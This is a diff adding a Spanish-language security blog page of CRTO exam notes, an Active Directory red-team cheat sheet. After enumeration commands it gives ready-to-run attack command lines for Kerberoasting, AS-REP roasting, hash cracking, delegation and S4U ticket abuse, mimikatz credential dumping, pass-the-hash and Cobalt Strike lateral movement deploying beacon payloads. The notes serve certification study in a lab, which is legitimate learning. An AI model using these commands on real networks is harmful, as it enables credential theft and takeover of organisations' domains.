@@ -1,0 +1,1044 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>CheatSheet ActiveDirectory - CRTO Notes // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CheatSheet ActiveDirectory - CRTO Notes"/>
+<meta name="twitter:description" content="Domain Enumeration Basic Domain Enumeration cmd - Domain Enumeration
+ipconfig /all route print net config workstation nltest /dclist:[Domain] \  echo %LOGONSERVER% net group /domain net user /domain net user [User] /domain net config workstation net use # Listamos Recursos del equipo net view \\[Host] /all	#wmic run wmic service get name,pathname run wmic logicaldisk get caption Local Computer Enumeration
+net user net user [User] net localgroup net localgroup [Administradores] whoami /user whoami /all /fo list whoami /priv #(Politica de seguridad del dominio) net accounts /domain \ Get-DomainPolicyData	Ldap Search LDAP: ldapsearch -H ldap://test."/>
+
+    <meta property="og:title" content="CheatSheet ActiveDirectory - CRTO Notes" />
+<meta property="og:description" content="Domain Enumeration Basic Domain Enumeration cmd - Domain Enumeration
+ipconfig /all route print net config workstation nltest /dclist:[Domain] \  echo %LOGONSERVER% net group /domain net user /domain net user [User] /domain net config workstation net use # Listamos Recursos del equipo net view \\[Host] /all	#wmic run wmic service get name,pathname run wmic logicaldisk get caption Local Computer Enumeration
+net user net user [User] net localgroup net localgroup [Administradores] whoami /user whoami /all /fo list whoami /priv #(Politica de seguridad del dominio) net accounts /domain \ Get-DomainPolicyData	Ldap Search LDAP: ldapsearch -H ldap://test." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/posts/activedirectory-cobaltstrike-notes/" />
+<meta property="article:published_time" content="2022-03-27T17:08:50+02:00" />
+<meta property="article:modified_time" content="2022-03-27T17:08:50+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="John Doe" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">CheatSheet ActiveDirectory - CRTO Notes</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          21 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="domain-enumeration">Domain Enumeration</h1>
+<h3 id="basic-domain-enumeration">Basic Domain Enumeration</h3>
+<p><strong>cmd - Domain Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ipconfig /all
+route print
+net config workstation
+
+nltest /dclist:<span style="color:#f92672">[</span>Domain<span style="color:#f92672">]</span> <span style="color:#ae81ff">\ </span>
+echo %LOGONSERVER% 
+
+
+net group /domain
+net user /domain
+net user <span style="color:#f92672">[</span>User<span style="color:#f92672">]</span> /domain
+net config workstation
+net use
+
+
+<span style="color:#75715e"># Listamos Recursos del equipo</span>
+net view <span style="color:#ae81ff">\\</span><span style="color:#f92672">[</span>Host<span style="color:#f92672">]</span> /all				
+
+<span style="color:#75715e">#wmic</span>
+run wmic service get name,pathname
+run wmic logicaldisk get caption
+</code></pre></div><p><strong>Local Computer Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">net user
+net user [User]
+
+net localgroup
+net localgroup [Administradores]
+
+whoami /user 
+whoami /all /fo list
+whoami /priv
+
+#(Politica de seguridad del dominio)
+
+net accounts /domain \
+Get-DomainPolicyData		
+</code></pre></div><h4 id="ldap-search">Ldap Search</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">LDAP:
+	ldapsearch -H ldap://test.local -b DC=test,DC=local <span style="color:#e6db74">&#34;(objectclass=group)&#34;</span>
+	ldapsearch -H ldap://test.local -b DC=test,DC=local <span style="color:#e6db74">&#34;(&amp;(objectclass=group)(name=[groupname]))&#34;</span>
+	ldapsearch -H ldap://test.local -b DC=test,DC=local <span style="color:#e6db74">&#34;(&amp;(objectclass=group)(name=*admin*))&#34;</span>
+</code></pre></div><hr>
+<h2 id="-powerview-enumeration">🔍 PowerView Enumeration</h2>
+<p><strong>Ubicar Sesiones de usuarios logueados</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">net sessions \\dc-2
+</code></pre></div><p><strong>Enumera las sesiones conectadas</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-NetSession -ComputerName dc-2 | select CName, UserName
+</code></pre></div><p><strong>Informacion del dominio actual</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Domain -Domain dev.evilcorp.local
+Get-DomainController -Domain dev.evilcorp.local | select Forest, Name, OSVersion | fl
+</code></pre></div><p><strong>Bosques del dominio</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-ForestDomain -Forest evilcorp.local
+</code></pre></div><p><strong>Mapear todo el dominio y sus relaciones</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Invoke-MapDomainTrust | select SourceName,TargetName,TrustDirection
+</code></pre></div><p><strong>Confianzas del dominio</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Get-DomainTrust -Domain dev.evilcorp.local
+</code></pre></div><p><strong>Enumerar Computadoras del dominio</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainComputer -Properties dnshostname,operatingsystem | sort -Property Dnshostname
+</code></pre></div><p><strong>Enumeraciones de usuario</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainUser -Properties Samaccountname,description
+</code></pre></div><p><strong>Enumerar un usuario especifico</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainUser -Identity <span style="color:#e6db74">&#34;[USER]&#34;</span> -Properties Displayname,Memberof | fl
+</code></pre></div><p><strong>Enumeracion de grupos</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGroup -Domain dev.evilcorp.local -Properties samaccountname
+powershell Get-DomainGroup | where Name <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*Admins*&#34;</span> | select SamAccountName
+</code></pre></div><p><strong>Enumerar Grupos filtrando por un patron</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGroup | where Name <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*Admins*&#34;</span> | select SamAccountName
+</code></pre></div><p><strong>Enumerar usuarios que pertenecen al grupo Domain Admins</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGroupMember -Identity <span style="color:#e6db74">&#34;Admins. del dominio&#34;</span> -Domain dev.evilcorp.local
+</code></pre></div><p><strong>Enumerar usuarios del grupo Domain admins pero listando el valor del elemento MemberDistinguishedname</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGroupMember -Identity <span style="color:#e6db74">&#34;Domain Admins&#34;</span> | select MemberDistinguishedName
+</code></pre></div><p><strong>Buscar Recursos Compartidos Accesibles</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 100
+</code></pre></div><p><strong>Buscar las máquinas de dominio en las que esos usuarios están conectados 🚩</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Find-DomainUserLocation 
+</code></pre></div><hr>
+<h3 id="ou-unidades-organizativas-y-gpos-del-dominiio"><strong>OU</strong> Unidades Organizativas Y <strong>GPOS</strong> del dominiio</h3>
+<p><strong>OU Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainOU -Properties Name | sort -Property Name
+</code></pre></div><p><strong>Gpo Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGPO -Properties DisplayName | sort -Property Displayname
+</code></pre></div><p><strong>Gpo Applied in a computer</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
+</code></pre></div><p><strong>Devuelve todos los GPO que modifican la pertenencia a grupos locales a través de Grupos restringidos</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
+</code></pre></div><p><strong>Enumera las máquinas donde un usuario/grupo de dominio específico es miembro de un grupo local específico</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
+</code></pre></div><p><strong>Busca usuarios con permisos para crear GPOS en el dominio (Generalmente son los Administradores)</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainObjectAcl -SearchBase <span style="color:#e6db74">&#34;CN=Enterprise Admins,CN=Users,DC=rto,DC=local&#34;</span> -ResolveGUIDs | ?{ $_.ObjectAceType <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Group-Policy-Container&#34;</span> } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
+</code></pre></div><p><strong>Convertir el SID para enumerar el objeto</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">ConvertFrom-SID S-1-5-21-2697495467-513533215-122973509-1137
+</code></pre></div><hr>
+<h2 id="-attacks">🏴‍☠️ Attacks</h2>
+<h4 id="kerberoasting">Kerberoasting</h4>
+<p>Tanto Kerberoasting como ASREPROASTING <strong>nos sirve solamente para Crackear el ticket</strong>
+<strong>Detect</strong> 🕵️‍♂️</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainUser -SPN | select samaccountname,serviceprincipalname,lastlogon
+</code></pre></div><p><strong>Attacking</strong> ⚔</p>
+<p>Rubeus</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">execute-assembly /opt/tools/rubeus/Rubeus.exe kerberoast /user:svc_test /nowrap
+</code></pre></div><p><strong>Powerview</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">1. Get-DomainSPNTicket -SPN <span style="color:#e6db74">&#34;MSSQLSvc/sqlserver.targetdomain.com&#34;</span>
+2. Invoke-Kerberoast -Domain dev.evilcorp.local -Identity <span style="color:#e6db74">&#34;svc_test&#34;</span> | fl | Out-File -Encoding UTF8 -FilePath c:\ProgramData\Kerberoast.txt -Append -Force
+</code></pre></div><p><strong>IMPACKET</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">GetUsersSPN.py dev.evilcorp.local/[$user]<span style="color:#960050;background-color:#1e0010">:</span>[$Pass] -request-user <span style="color:#e6db74">&#34;svc_test&#34;</span>
+</code></pre></div><h5 id="cracking-">Cracking 🪓</h5>
+<p><strong>hashcat</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">13100</span> hash.txt <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/rockyou.txt --rules-file <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/hashcat/rules/best64.rule
+</code></pre></div><p><strong>john</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div><h4 id="asreproasting">ASREPROASTING</h4>
+<p><strong>Detect</strong> 🕵️‍♂️</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainUser -PreAuthNotRequired | select samaccountname,description,lastlogon
+</code></pre></div><p><strong>Attacking</strong> ⚔</p>
+<p><strong>Rubeus</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">execute<span style="color:#f92672">-</span>assembly <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>tools<span style="color:#f92672">/</span>rubeus<span style="color:#f92672">/</span>Rubeus<span style="color:#f92672">.</span><span style="color:#a6e22e">exe</span> asreproast <span style="color:#f92672">/</span>user<span style="color:#f92672">:</span>c<span style="color:#f92672">.</span><span style="color:#a6e22e">rodolfo</span> <span style="color:#f92672">/</span>nowrap
+</code></pre></div><p><strong>Impacket</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">GetNPUsers.py DEV/c.rodolfo -no-pass
+GetNPUsers.py dev.evilcorp.local/ -no-pass -usersfile users.txt
+</code></pre></div><h4 id="unconstrained-delegation--podemos-encadenarlo-con-printer-bug">Unconstrained Delegation 🔗 Podemos encadenarlo con Printer Bug</h4>
+<p><strong>Permite que un usuario actue en nombre de otro usuario u otro servicio</strong>. además podemos encadenar esta vulnerabilidad con el error de la impresora (&lsquo;spoolsample&rsquo;)</p>
+<p><strong>Detect</strong> 🕵️‍♂️</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainComputer -Unconstrained | select Dnshostname,operatingsystem
+</code></pre></div><p><strong>SpoolSample</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">execute-assembly c:<span style="color:#ae81ff">\B</span>inaries<span style="color:#ae81ff">\R</span>ubeus.exe monitor /interval:10 /nowrap
+execute-assembly c:<span style="color:#ae81ff">\B</span>inaries<span style="color:#ae81ff">\S</span>poolSample.exe dc-2 srv-1
+</code></pre></div><p>Podemos usar el ticket si lo convertimos de B64 a su formato nativo o podemos usar rubeus</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Rubeus.exe ptt /ticket:&lt;base64ticket&gt;
+</code></pre></div><h4 id="constrained--podemos-encadenarlo-con-alternative-service">Constrained 🔗 Podemos encadenarlo con Alternative Service</h4>
+<p><strong>a diferencia de Unconstrained, Constrained Restringe los servicios a lo que el Usuario puede aceder</strong></p>
+<blockquote>
+<p><strong>Para aprovecharnos de <strong>Alternative Service</strong> debemos primero hacernos con la maquina, pedir su tgt, impersonalizar y alternar el servicio.</strong></p>
+</blockquote>
+<p><strong>Detect</strong> 🕵️‍♂️</p>
+<p>Enumerate Users and Computers with constrained delegation</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
+</code></pre></div><p><strong>Attacking</strong> ⚔</p>
+<p>Primero necesitamos un ticket de usuario para pedir el vale de servicio.</p>
+<ol>
+<li>Pidiendo un TGT desde el usuario que tiene un vale para el TGS</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">execute<span style="color:#f92672">-</span>assembly <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>tools<span style="color:#f92672">/</span>rubeus<span style="color:#f92672">/</span>Rubeus<span style="color:#f92672">.</span><span style="color:#a6e22e">exe</span> tgtdeleg <span style="color:#f92672">/</span>nowrap
+</code></pre></div><p><strong>Alternativa</strong>
+Solicitando un TGT si es que tenemos el hash o la contraseña del usuario</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">execute-assembly /opt/tools/rubeus/Rubeus.exe asktgt /user:svc_test /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap
+</code></pre></div><ol start="2">
+<li>Solicitando el TGS e impersonalizando a un usuario Administrador en la computador que tiene el <strong>Unconstraied Delegation</strong></li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(S4U con Ticket)</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /ticket:<span style="color:#f92672">[</span>..Ticket..<span style="color:#f92672">]</span> /nowrap
+
+<span style="color:#75715e">#(RC4 | AES256)</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap
+
+<span style="color:#75715e">#(Tambien Podemos Carga el ticket directamente en memoria /ptt)</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap /ptt
+
+</code></pre></div><ol start="3">
+<li>Utilizando el Ticket de servicio</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(powershell)</span>
+<span style="color:#f92672">[</span>System.IO.File<span style="color:#f92672">]</span>::WriteAllBytes<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c:\users\administrator\desktop\dc2-tgt.kirbi&#34;</span>, <span style="color:#f92672">[</span>System.convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[..ticket..]&#34;</span><span style="color:#f92672">))</span>
+kerberos_ticket_use <span style="color:#e6db74">&#34;c:\users\administrator\desktop\dc-2tgt.kirbi&#34;</span>
+
+<span style="color:#75715e">#(Alternativa)</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe ptt /ticket:<span style="color:#f92672">[</span>..ticket..<span style="color:#f92672">]</span>
+
+</code></pre></div><h5 id="alternative-service">Alternative Service</h5>
+<p>¿Qué pasa si tenemos derechos de delegación solo para un SPN específico?</p>
+<ul>
+<li>Aun podemos abusar de una funcion de kerberos llamada &ldquo;Servicio Alternativo&rdquo; .Esto nos permite solicitar un TGS para otro servicio &lsquo;Alternativo&rsquo; ,lo que nos da la posibilidad de solcitar un TGS para un servicio que el host admita</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">execute-assembly C:<span style="color:#ae81ff">\T</span>ools<span style="color:#ae81ff">\R</span>ubeus<span style="color:#ae81ff">\R</span>ubeus<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\D</span>ebug<span style="color:#ae81ff">\R</span>ubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
+</code></pre></div><p><strong>example</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Detect</span>
+Get-DomainComputer -TrustedToAuth | select -exp msds-allowedtodelegateto
+
+samaccountname<span style="color:#960050;background-color:#1e0010">:</span> WINDOWSSERVER$
+-----
+Result
+-----
+eventlog/dc-2.dev.evilcorp.local/dev.evilcorp.local
+eventlog/dc-2.dev.evilcorp.local
+eventlog/DC-2
+eventlog/dc-2.dev.evilcorp.local/DEV
+eventlog/DC-2/DEV
+cifs/WKSTN-1.dev.evilcorp.local
+cifs/WKSTN-1
+----------
+
+<span style="color:#75715e"># Primero nos hacemos con el TGT de la maquina con el constrained delegation</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe triage
+execute-assembly /opt/tools/rubeus/Rubeus.exe dump /luid<span style="color:#960050;background-color:#1e0010">:</span>0x3e7 /service<span style="color:#960050;background-color:#1e0010">:</span>krbtgt /nowrap || \
+mimikatz sekurlsa::ekeys
+
+<span style="color:#75715e"># Impersonalizamos y Alternamos el servicio</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>WINDOWSSERVER$ /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrador /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>eventlog/dc-2.dev.evilcorp.local /altservice<span style="color:#960050;background-color:#1e0010">:</span>cifs /ticket<span style="color:#960050;background-color:#1e0010">:</span>[..KRBTGT/WINDOWSSERVER..] /nowrap
+
+<span style="color:#75715e"># Exportamos el ticket</span>
+echo <span style="color:#e6db74">&#34;[..Ticket..]&#34;</span> | base64 -d &gt; Cifs-Dc-2.kirbi
+
+<span style="color:#75715e"># Lo utilizamos</span>
+readlink <span style="color:#f92672">-f</span> Cifs-Dc-2.kirbi | xclip -sel clip
+kerberos_ticket_use 
+</code></pre></div><hr>
+<h2 id="-lateral-movements">🥷 Lateral Movements</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">
+#(Jump)
+jump psexec64 SRV-1 WKSTN-1-PIVOT4444
+jump psexec_psh SRV-1 WKSTN-1-PIVOT4444
+jump winrm64 SRV-1 WKSTN-1-PIVOT4444
+
+#(Ejecutar un comando de powershell remotamente)
+remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources
+
+#(wmi utiliza <span style="color:#e6db74">&#34;process call create&#34;</span> de wmic sirve para ejecutar un binario o dll)
+remote-exe wmi srv-1 cmd.exe /c calc.exe
+remote-exe wmi srv-2 notepad.exe
+remote-exec wmi WINDOWSSERVER rundll32 c:\programdata\beacon.dll,StartW
+
+<span style="color:#66d9ef">cd</span> \\sql-1\c$\Programdata
+upload beacon-svc.exe
+remote-exec wmi sql-1 c:\Programdata\beacon-svc.exe
+(link|connect) sql-1 
+
+#(Wmic Example)
+shell wmic /node:<span style="color:#e6db74">&#34;srv-1.dev.cyberbotic.io&#34;</span> process call create <span style="color:#e6db74">&#34;c:\programdata\pivot-4444.exe&#34;</span>
+
+#(Wmi Examples)
+remote-exec wmi SRV-1 c:\Programdata\pivot-4444.exe
+
+### Pass the hash rc4 - ntlm
+lsadump::sam 			 		-&gt; Only Local Accounts
+sekurlsa::logonpasswords	    -&gt; Usuarios logueados en el sistema
+
+#(cobalt)
+pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e
+
+ls \\srv-2\c$
+</code></pre></div><h2 id="execute-remote-commands---remote-exec">Execute Remote Commands - Remote-exec</h2>
